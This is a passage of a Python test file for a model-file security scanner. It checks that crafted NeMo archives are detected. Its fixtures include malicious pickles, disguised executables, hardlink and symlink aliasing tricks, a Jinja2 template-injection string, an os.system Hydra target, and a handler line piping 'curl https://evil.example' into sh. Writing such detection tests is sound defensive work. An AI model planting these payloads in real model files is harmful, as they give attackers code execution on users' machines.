        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_link_resolution_unsupported" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_hardlink_checkpoint_alias_detects_unknown_type_write_through(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-unknown-type-write.nemo"
        malicious_payload = _build_malicious_pickle()
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "payload.bin", b"safe weights")
            checkpoint_link = tarfile.TarInfo(name="model_weights.ckpt")
            checkpoint_link.type = tarfile.LNKTYPE
            checkpoint_link.linkname = "payload.bin"
            tar.addfile(checkpoint_link)
            unknown_payload = tarfile.TarInfo(name="payload.bin")
            unknown_payload.type = b"Z"
            unknown_payload.size = len(malicious_payload)
            tar.addfile(unknown_payload, io.BytesIO(malicious_payload))

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "model_weights.ckpt"
        ]
        assert len(cve_checks) == 1

    def test_large_checkpoint_member_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-large.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", b"not scanned")

        result = NemoScanner({"max_nemo_checkpoint_scan_bytes": 1}).scan(str(nemo_path))

        skipped_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_checkpoint_scan_skipped_size_limit"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(skipped_checks) == 1
        assert skipped_checks[0].status == CheckStatus.FAILED
        assert skipped_checks[0].details["max_scan_bytes"] == 1

    def test_nested_checkpoint_scanner_failure_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        class RaisingScanner:
            name = "raising_nested"

            def scan(self, _path: str) -> None:
                raise RuntimeError("nested boom")

        monkeypatch.setattr(
            "modelaudit.scanners.nemo_scanner._get_nested_scanner_for_file",
            lambda _path, config=None: RaisingScanner(),
        )

        nemo_path = tmp_path / "checkpoint-nested-fails.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", b"checkpoint bytes")

        result = NemoScanner().scan(str(nemo_path))

        failed_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_checkpoint_nested_scan_failed"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(failed_checks) == 1
        assert failed_checks[0].details["nested_scanner"] == "raising_nested"
        assert failed_checks[0].details["exception_type"] == "RuntimeError"

    def test_checkpoint_without_nested_scanner_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr(
            "modelaudit.scanners.nemo_scanner._get_nested_scanner_for_file",
            lambda _path, config=None: None,
        )

        nemo_path = tmp_path / "checkpoint-no-scanner.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", b"checkpoint bytes")

        result = NemoScanner().scan(str(nemo_path))

        unsupported_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_checkpoint_no_nested_scanner"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(unsupported_checks) == 1
        assert unsupported_checks[0].details["entry"] == "model_weights.ckpt"

    def test_benign_checkpoint_pickle_no_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-safe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.ckpt", pickle.dumps({"weights": [1, 2, 3]}))

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]

    def test_embedded_python_member_retains_generic_tar_security_analysis(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "handler-rce.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "handler.py", b"import os\nos.system('echo hidden')\n")

        result = NemoScanner().scan(str(nemo_path))

        checks = [check for check in result.checks if check.name == "Python Archive Member Security"]
        assert len(checks) == 1
        assert checks[0].status == CheckStatus.FAILED
        assert checks[0].rule_code == "S101"
        assert checks[0].details["entry"] == "handler.py"

    def test_oversized_embedded_python_member_stays_incomplete_with_suffix_finding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        monkeypatch.setattr("modelaudit.scanners.nemo_scanner.NEMO_MAX_PYTHON_ANALYSIS_BYTES", 8)
        nemo_path = tmp_path / "oversized-handler.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "handler.py", b"012345678")

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is False
        assert result.metadata["analysis_incomplete"] is True
        assert "nemo_python_member_analysis_incomplete" in result.metadata["scan_outcome_reasons"]
        assert any(
            check.name == "Python Archive Member Security" and check.details.get("analysis_incomplete") is True
            for check in result.checks
        )
        assert any(check.name == "Suspicious File in NeMo Archive" for check in result.checks)

    def test_renamed_nemo_embedded_executable_retains_archive_member_analysis(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "embedded-executable.jpg"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "assets/payload.jpg", b"\x7fELF\x02\x01\x01\x00")

        result = scan_file(str(nemo_path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        checks = [check for check in result.checks if check.name == "Executable Archive Member Detection"]
        assert len(checks) == 1
        assert checks[0].status == CheckStatus.FAILED
        assert checks[0].details["entry"] == "assets/payload.jpg"

    def test_renamed_nemo_embedded_pe_after_short_prefix_is_detected(self, tmp_path: Path) -> None:
        payload = bytearray(b"MZ" + (b"\0" * (8192 + 4 - 2)))
        payload[0x3C:0x40] = (8192).to_bytes(4, "little")
        payload[8192:8196] = b"PE\0\0"
        nemo_path = tmp_path / "embedded-pe.jpg"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "assets/payload.jpg", bytes(payload))

        result = scan_file(str(nemo_path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "Executable Archive Member Detection"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "assets/payload.jpg"
            for check in result.checks
        )

    def test_renamed_nemo_retains_recursive_tar_scanning_for_unreferenced_archive(self, tmp_path: Path) -> None:
        nested_archive = io.BytesIO()
        with zipfile.ZipFile(nested_archive, "w") as archive:
            archive.writestr("handler.py", b"import os\nos.system('echo hidden')\n")

        nemo_path = tmp_path / "nested-bundle.jpg"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "assets/bundle.zip", nested_archive.getvalue())

        result = scan_file(str(nemo_path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "Python Archive Member Security"
            and check.status == CheckStatus.FAILED
            and "assets/bundle.zip" in str(check.location)
            for check in result.checks
        )

    def test_renamed_nemo_retains_auxiliary_yaml_template_scanning(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "templated-model.jpg"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(
                tar,
                "chat_model_config.yaml",
                b"chat_template: \"{{ ''.__class__.__mro__[1].__subclasses__() }}\"\n",
            )

        result = scan_file(str(nemo_path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "Jinja2 Template Injection Detection"
            and check.status == CheckStatus.FAILED
            and "chat_model_config.yaml" in str(check.location)
            for check in result.checks
        )

    def test_large_disguised_executable_is_detected_from_bounded_prefix(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "large-embedded-executable.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "assets/payload.jpg", b"\x7fELF" + (b"\x00" * (10 * 1024 * 1024 + 1)))

        result = NemoScanner().scan(str(nemo_path))

        checks = [check for check in result.checks if check.name == "Executable Archive Member Detection"]
        assert len(checks) == 1
        assert checks[0].details["entry"] == "assets/payload.jpg"

    def test_declared_nemo_embedded_pe_after_initial_probe_is_detected(self, tmp_path: Path) -> None:
        payload = bytearray(b"MZ" + (b"\0" * (8192 + 4 - 2)))
        payload[0x3C:0x40] = (8192).to_bytes(4, "little")
        payload[8192:8196] = b"PE\0\0"
        nemo_path = tmp_path / "embedded-pe.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "assets/payload.jpg", bytes(payload))

        result = NemoScanner().scan(str(nemo_path))

        assert any(
            check.name == "Executable Archive Member Detection"
            and check.status == CheckStatus.FAILED
            and check.details["entry"] == "assets/payload.jpg"
            for check in result.checks
        )

    def test_benign_embedded_python_member_does_not_create_security_finding(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "benign-handler.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "handler.py", b"def build_model():\n    return 'safe'\n")

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.name == "Python Archive Member Security"]

    def test_metadata_referenced_misnamed_payload_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-misnamed-payload.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/payload.jpg", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [
            check
            for check in result.checks
            if check.details.get("cve_id") == "CVE-2025-23249" and check.details.get("entry") == "artifacts/payload.jpg"
        ]
        assert len(cve_checks) == 1
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["config_file"] == "model_config.yaml"
        assert cve_checks[0].details["config_path"] == "tokenizer.model"
        assert cve_checks[0].details["source_entry"] == "artifacts/payload.jpg"

    def test_metadata_referenced_misnamed_payload_hardlink_write_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-misnamed-payload-hardlink-write.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/payload.jpg", b"safe payload")
            writer_link = tarfile.TarInfo(name="writer.bin")
            writer_link.type = tarfile.LNKTYPE
            writer_link.linkname = "artifacts/payload.jpg"
            tar.addfile(writer_link)
            _add_tar_bytes(tar, "writer.bin", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is False
        assert "nemo_referenced_link_semantics_incomplete" in result.metadata["scan_outcome_reasons"]
        assert not any(check.details.get("cve_id") == "CVE-2025-23249" for check in result.checks)

    def test_unrelated_hardlink_write_does_not_mark_referenced_payload_incomplete(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-payload-unrelated-hardlink-write.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/payload.jpg"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/payload.jpg", b"safe payload")
            _add_tar_bytes(tar, "other.bin", b"safe payload")
            writer_link = tarfile.TarInfo(name="writer.bin")
            writer_link.type = tarfile.LNKTYPE
            writer_link.linkname = "other.bin"
            tar.addfile(writer_link)
            _add_tar_bytes(tar, "writer.bin", b"safe replacement")

        result = NemoScanner().scan(str(nemo_path))

        assert "nemo_referenced_link_semantics_incomplete" not in result.metadata.get("scan_outcome_reasons", [])

    def test_many_referenced_members_share_one_link_mutation_replay(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        referenced_names = {f"artifacts/tokenizer-{index}.model" for index in range(20)}
        config = {
            "model": {"_target_": "nemo.Model"},
            "artifacts": [f"nemo:{name}" for name in sorted(referenced_names)] + ["nemo:artifacts/tokenizer-0.model"],
        }
        scoped_replays: list[set[str]] = []
        original_replay = NemoScanner._archive_has_link_mediated_loaded_path

        def track_replay(
            cls: type[NemoScanner],
            archive_members: list[tarfile.TarInfo],
            member_visit_budget: list[int],
            *,
            additional_loaded_member_names: set[str] | None = None,
            include_default_loaded_member_names: bool = True,
        ) -> bool:
            _ = cls
            if additional_loaded_member_names is not None:
                scoped_replays.append(set(additional_loaded_member_names))
            return original_replay(
                archive_members,
                member_visit_budget,
                additional_loaded_member_names=additional_loaded_member_names,
                include_default_loaded_member_names=include_default_loaded_member_names,
            )

        monkeypatch.setattr(NemoScanner, "_archive_has_link_mediated_loaded_path", classmethod(track_replay))
        nemo_path = tmp_path / "referenced-many-benign-artifacts.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            for name in referenced_names:
                _add_tar_bytes(tar, name, b"plain tokenizer bytes")

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is True
        assert scoped_replays == [referenced_names]

    def test_config_referenced_checkpoint_suffix_is_not_scanned_twice(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-checkpoint.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "checkpoint": "nemo:model_weights.ckpt",
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["entry"] == "model_weights.ckpt"
        assert cve_checks[0].details["config_file"] == "model_config.yaml"
        assert cve_checks[0].details["config_path"] == "checkpoint"

    def test_checkpoint_suffix_before_config_reference_is_not_scanned_twice(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "checkpoint-before-reference.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "checkpoint": "nemo:model_weights.ckpt",
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_weights.ckpt", _build_malicious_pickle())
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())

        result = NemoScanner().scan(str(nemo_path))

        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["entry"] == "model_weights.ckpt"

    def test_large_config_referenced_member_fails_closed(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-large-artifact.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/tokenizer.model", b"not scanned")

        result = NemoScanner({"max_nemo_checkpoint_scan_bytes": 1}).scan(str(nemo_path))

        skipped_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_checkpoint_scan_skipped_size_limit"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(skipped_checks) == 1
        assert skipped_checks[0].details["entry"] == "artifacts/tokenizer.model"
        assert skipped_checks[0].details["source_entry"] == "artifacts/tokenizer.model"
        assert skipped_checks[0].details["config_file"] == "model_config.yaml"
        assert skipped_checks[0].details["config_path"] == "tokenizer.model"
        assert skipped_checks[0].details["max_scan_bytes"] == 1

    def test_unextractable_config_referenced_member_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        def fail_extract(
            _tar: tarfile.TarFile,
            _member: tarfile.TarInfo,
            *,
            suffix_source: str | None = None,
            max_bytes: int | None = None,
        ) -> str | None:
            return None

        monkeypatch.setattr(NemoScanner, "_extract_member_to_tempfile", staticmethod(fail_extract))

        nemo_path = tmp_path / "referenced-unextractable-artifact.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/tokenizer.model", b"payload")

        result = NemoScanner().scan(str(nemo_path))

        failed_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_checkpoint_extract_failed"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(failed_checks) == 1
        assert failed_checks[0].details["entry"] == "artifacts/tokenizer.model"
        assert failed_checks[0].details["source_entry"] == "artifacts/tokenizer.model"
        assert failed_checks[0].details["config_file"] == "model_config.yaml"
        assert failed_checks[0].details["config_path"] == "tokenizer.model"

    def test_config_referenced_nested_scan_failure_fails_closed(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from modelaudit.scanners import archive_dispatch

        def raise_nested_scan(_path: str, config: dict[str, Any] | None = None) -> Any:
            _ = config
            raise RuntimeError("referenced nested boom")

        monkeypatch.setattr(archive_dispatch, "scan_nested_file", raise_nested_scan)

        nemo_path = tmp_path / "referenced-nested-fails.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/tokenizer.model", b"payload")

        result = NemoScanner().scan(str(nemo_path))

        failed_checks = [
            check
            for check in result.checks
            if check.details.get("scan_outcome_reason") == "nemo_referenced_nested_scan_failed"
        ]
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert len(failed_checks) == 1
        assert failed_checks[0].details["entry"] == "artifacts/tokenizer.model"
        assert failed_checks[0].details["source_entry"] == "artifacts/tokenizer.model"
        assert failed_checks[0].details["config_file"] == "model_config.yaml"
        assert failed_checks[0].details["config_path"] == "tokenizer.model"
        assert failed_checks[0].details["exception_type"] == "RuntimeError"
        assert failed_checks[0].details["exception_message"] == "referenced nested boom"

    def test_metadata_referenced_benign_non_checkpoint_suffix_stays_clean(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-benign-artifact.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "tokenizer": {"model": "nemo:artifacts/tokenizer.model"},
        }
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/tokenizer.model", b"plain tokenizer bytes")

        result = NemoScanner().scan(str(nemo_path))

        assert result.success is True
        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert "scan_outcome" not in result.metadata

    def test_metadata_referenced_torchserve_finding_is_not_deserialization_cve(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "referenced-torchserve.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "handler": "nemo:artifacts/handler.mar",
        }
        mar_payload = io.BytesIO()
        with zipfile.ZipFile(mar_payload, "w") as archive:
            archive.writestr(
                "MAR-INF/MANIFEST.json",
                '{"model":{"serializedFile":"weights.bin","handler":"handler.py"}}',
            )
            archive.writestr("weights.bin", b"weights")
            archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert any(
            "Handler contains high-risk execution primitives" in check.message
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_checkpoint_alias_before_torchserve_reference_retains_specialized_scan(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "alias-before-referenced-torchserve.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "handler": "nemo:artifacts/handler.mar",
        }
        mar_payload = io.BytesIO()
        with zipfile.ZipFile(mar_payload, "w") as archive:
            archive.writestr(
                "MAR-INF/MANIFEST.json",
                '{"model":{"serializedFile":"weights.bin","handler":"handler.py"}}',
            )
            archive.writestr("weights.bin", b"weights")
            archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
        with tarfile.open(nemo_path, "w") as tar:
            link_info = tarfile.TarInfo(name="model_weights.ckpt")
            link_info.type = tarfile.SYMTYPE
            link_info.linkname = "artifacts/handler.mar"
            tar.addfile(link_info)
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())

        result = NemoScanner().scan(str(nemo_path))

        assert any(
            "Handler contains high-risk execution primitives" in check.message
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_checkpoint_alias_does_not_suppress_referenced_alias_torchserve_scan(self, tmp_path: Path) -> None:
        nemo_path = tmp_path / "alias-before-referenced-alias-torchserve.nemo"
        config = {
            "model": {"_target_": "nemo.Model"},
            "handler": "nemo:configured.ckpt",
        }
        mar_payload = io.BytesIO()
        with zipfile.ZipFile(mar_payload, "w") as archive:
            archive.writestr(
                "MAR-INF/MANIFEST.json",
                '{"model":{"serializedFile":"weights.bin","handler":"handler.py"}}',
            )
            archive.writestr("weights.bin", b"weights")
            archive.writestr("handler.py", b"import os\nos.system('curl https://evil.example | sh')\n")
        with tarfile.open(nemo_path, "w") as tar:
            for alias in ("autoload.ckpt", "configured.ckpt"):
                link_info = tarfile.TarInfo(name=alias)
                link_info.type = tarfile.SYMTYPE
                link_info.linkname = "artifacts/handler.mar"
                tar.addfile(link_info)
            _add_tar_bytes(tar, "model_config.yaml", yaml.safe_dump(config).encode())
            _add_tar_bytes(tar, "artifacts/handler.mar", mar_payload.getvalue())

        result = NemoScanner().scan(str(nemo_path))

        assert any(
            "Handler contains high-risk execution primitives" in check.message
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_nested_checkpoint_archive_traversal_not_labeled_deserialization_cve(self, tmp_path: Path) -> None:
        nested_checkpoint = io.BytesIO()
        with zipfile.ZipFile(nested_checkpoint, "w") as zipf:
            zipf.writestr("../../evil.pkl", b"not a pickle")

        nemo_path = tmp_path / "checkpoint-archive-traversal.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(tar, "model_weights.pt", nested_checkpoint.getvalue())

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
        assert any(
            check.name == "Path Traversal Protection"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            for check in result.checks
        )

    def test_promoted_nemo_nested_tar_retains_entry_limit(self, tmp_path: Path) -> None:
        nested_tar = io.BytesIO()
        with tarfile.open(fileobj=nested_tar, mode="w") as archive:
            _add_tar_bytes(archive, "one.bin", b"one")
            _add_tar_bytes(archive, "two.bin", b"two")
            _add_tar_bytes(archive, "three.bin", b"three")

        path = tmp_path / "nested-limit.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model: safe\n")
            _add_tar_bytes(archive, "assets/bundle.tar", nested_tar.getvalue())

        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_entries": 2})

        assert result.scanner_name == "nemo"
        assert result.success is False
        assert any(
            check.name == "Entry Count Limit Check"
            and check.status == CheckStatus.FAILED
            and check.details["entries"] == 3
            for check in result.checks
        )

    def test_promoted_nested_nemo_obeys_tar_depth_limit(self, tmp_path: Path) -> None:
        nested_nemo = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": "os.system", "command": "echo pwned"}},
            filename="inner.jpg",
        )
        path = tmp_path / "outer.tar"
        with tarfile.open(path, "w") as archive:
            archive.add(nested_nemo, arcname="inner.jpg")

        result = scan_file(str(path), config={"cache_scan_results": False, "max_tar_depth": 1})

        assert result.scanner_name == "tar"
        assert any(
            check.name == "TAR Depth Bomb Protection" and check.status == CheckStatus.FAILED for check in result.checks
        )
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra _target_" for check in result.checks)


@pytest.mark.skipif(not HAS_YAML, reason="PyYAML not installed")
class TestCVE202523304HydraTarget:
    """Tests for CVE-2025-23304: Hydra _target_ injection detection."""

    def test_dangerous_os_system_detected(self, tmp_path):
        """os.system _target_ should trigger CVE-2025-23304 CRITICAL."""
        config = {
            "model": {
                "_target_": "os.system",
                "command": "echo pwned",
            }
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) > 0, f"Should detect dangerous _target_. Checks: {[c.message for c in result.checks]}"
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details.get("cve_id") == "CVE-2025-23304"
        assert cve_checks[0].details.get("target") == "os.system"

    def test_core_scan_file_routes_nemo_archive_to_nemo_scanner(self, tmp_path: Path) -> None:
        """Real .nemo scans should use NemoScanner, not the generic TAR scanner."""
        config = {
            "model": {
                "_target_": "os.system",
                "command": "echo pwned",
            }
        }
        path = _create_nemo_file(tmp_path, config)

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_renamed_nemo_archive_and_detects_dangerous_target(self, tmp_path: Path) -> None:
        config = {"model": {"_target_": "os.system", "command": "echo pwned"}}
        path = _create_nemo_file(tmp_path, config, filename="model.jpg")

        assert NemoScanner.can_handle(str(path))

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details["target"] == "os.system"
            for check in result.checks
        )

        directory = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
        assert directory.files_scanned == 1
        assert "nemo" in directory.scanner_names
        assert any(issue.severity == IssueSeverity.CRITICAL for issue in directory.issues)

    def test_core_routes_gzip_wrapped_renamed_nemo_archive(self, tmp_path: Path) -> None:
        path = tmp_path / "compressed.jpg"
        with tarfile.open(path, "w:gz") as archive:
            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    def test_core_routes_normalized_root_config_in_renamed_nemo_archive(self, tmp_path: Path) -> None:
        path = tmp_path / "normalized-config.jpg"
        with tarfile.open(path, "w") as archive:
            _add_tar_bytes(
                archive,
                "configs/../model_config.yaml",
                b"model:\n  _target_: os.system\n  command: echo pwned\n",
            )

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.details["target"] == "os.system"
            for check in result.checks
        )

    @pytest.mark.parametrize("link_type", [tarfile.SYMTYPE, tarfile.LNKTYPE])
    @pytest.mark.parametrize(
        ("config_name", "payload_name"),
        [("model_config.yaml", "payload.txt"), ("configs/../model_config.yaml", "configs/../payload.txt")],
    )
    def test_core_routes_renamed_nemo_archive_with_linked_root_config(
        self,
        tmp_path: Path,
        link_type: bytes,
        config_name: str,
        payload_name: str,
    ) -> None:
        path = tmp_path / "linked-config.jpg"
        with tarfile.open(path, "w") as archive:
